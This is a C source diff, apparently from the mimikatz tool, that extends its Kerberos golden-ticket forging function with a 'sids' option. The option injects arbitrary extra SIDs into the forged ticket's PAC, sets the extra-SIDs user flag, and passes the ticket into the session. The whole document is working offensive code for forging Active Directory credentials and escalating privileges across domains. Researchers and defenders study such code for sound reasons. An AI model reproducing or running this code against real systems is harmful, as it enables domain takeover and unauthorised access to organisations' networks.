@@ -314,10 +314,12 @@ GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAU
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, id = 500, keyType, rodc = 0,/*keyLen,*/ App_KrbCredSize;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szRodc, szLifetime, base, filename;
-	PISID pSid;
+	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType, rodc = 0,/*keyLen,*/ App_KrbCredSize;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, base, filename;
+	PWCHAR baseSid, tmpSid;
+	PISID pSid, pSidTmp;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
+	PKERB_SID_AND_ATTRIBUTES sids = NULL;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
 	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
@@ -386,6 +388,42 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							nbGroups = ARRAYSIZE(defaultGroups);
 						}
 						
+						if(kull_m_string_args_byName(argc, argv, L"sids", &szSids, NULL))
+						{
+							if(tmpSid = _wcsdup(szSids))
+							{
+								for(nbSids = 0, base = tmpSid; base && *base; )
+								{
+									if(baseSid = wcschr(base, L','))
+										*baseSid = L'\0';
+									if(ConvertStringSidToSid(base, (PSID *) &pSidTmp))
+									{
+										nbSids++;
+										LocalFree(pSidTmp);
+									}
+									if(base = baseSid)
+										base++;
+								}
+								free(tmpSid);
+							}
+							if(nbSids && (sids = (PKERB_SID_AND_ATTRIBUTES) LocalAlloc(LPTR, nbSids * sizeof(KERB_SID_AND_ATTRIBUTES))))
+							{
+								if(tmpSid = _wcsdup(szSids))
+								{
+									for(i = 0, base = tmpSid; (base && *base) && (i < nbSids); )
+									{
+										if(baseSid = wcschr(base, L','))
+											*baseSid = L'\0';
+										if(ConvertStringSidToSid(base, (PSID *) &sids[i].Sid))
+											sids[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+										if(base = baseSid)
+											base++;
+									}
+									free(tmpSid);
+								}
+							}
+						}
+
 						status = CDLocateCSystem(keyType, &pCSystem);
 						if(NT_SUCCESS(status))
 						{
@@ -408,6 +446,15 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 								kprintf(L"Groups Id : *");
 								for(i = 0; i < nbGroups; i++)
 									kprintf(L"%u ", groups[i]);
+								if(nbSids)
+								{
+									kprintf(L"\nExtra SIDs: ");
+									for(i = 0; i < nbSids; i++)
+									{
+										kull_m_string_displaySID(sids[i].Sid);
+										kprintf(L" ; ");
+									}
+								}
 								kprintf(L"\nServiceKey: ");
 								kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
 								if(szService)
@@ -421,7 +468,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 								kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-								if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, rodc))
+								if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc))
 								{
 									App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
 									if(isPtt)
@@ -455,7 +502,12 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 	if(dynGroups)
 		LocalFree(groups);
-
+	if(sids && nbSids)
+	{
+		for(i = 0; i < nbSids; i++)
+			LocalFree(sids[i].Sid);
+		LocalFree(sids);
+	}
 	return STATUS_SUCCESS;
 }
 
@@ -491,7 +543,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, DWORD rodc)
+PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc)
 {
 	NTSTATUS status;
 	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
@@ -534,7 +586,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
 	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
 	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);
-	RtlInitUnicodeString(&validationInfo.LogonDomainName, L"eo.oe.kiwi :)");
+	RtlInitUnicodeString(&validationInfo.LogonDomainName, L"<3 eo.oe ~ ANSSI E>");
 
 	validationInfo.EffectiveName		= ticket.ClientName->Names[0];
 	validationInfo.LogonDomainId		= sid;
@@ -544,6 +596,11 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 
 	validationInfo.GroupCount = cbGroups;
 	validationInfo.GroupIds = groups;
+	validationInfo.SidCount = cbSids;
+	validationInfo.ExtraSids = sids;
+
+	if(cbSids && sids)
+		validationInfo.UserFlags |= 0x20;
 
 	switch(keyType)
 	{
